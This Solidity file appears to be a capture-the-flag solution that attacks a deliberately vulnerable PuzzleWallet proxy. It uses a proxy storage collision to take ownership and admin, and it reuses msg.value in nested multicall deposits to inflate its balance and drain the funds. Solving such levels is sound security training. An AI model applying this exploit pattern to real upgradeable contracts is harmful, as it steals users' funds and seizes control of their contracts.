// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuzzleWallet.sol";

contract AttackPuzzleWallet {
    address public pendingAdmin1;
    address public admin;

    address owner;
    PuzzleProxy immutable victimProxy;
    PuzzleWallet immutable victimLogic;

    constructor(PuzzleProxy _victimProxy, PuzzleWallet _victimLogic) {
        owner = msg.sender;
        victimProxy = _victimProxy;
        victimLogic = _victimLogic;
    }

    function attack() external payable {
        victimProxy.proposeNewAdmin(address(this));
        victimLogic.addToWhitelist(address(this));

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(victimLogic.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = depositSelector[0];
        data[1] = abi.encodeWithSelector(victimLogic.multicall.selector, depositSelector);
        victimLogic.multicall{value: msg.value}(data);

        uint256 amount = victimLogic.balances(address(this));
        victimLogic.execute(owner, amount, "");
        victimLogic.setMaxBalance(uint256(uint160(owner)));
    }
}
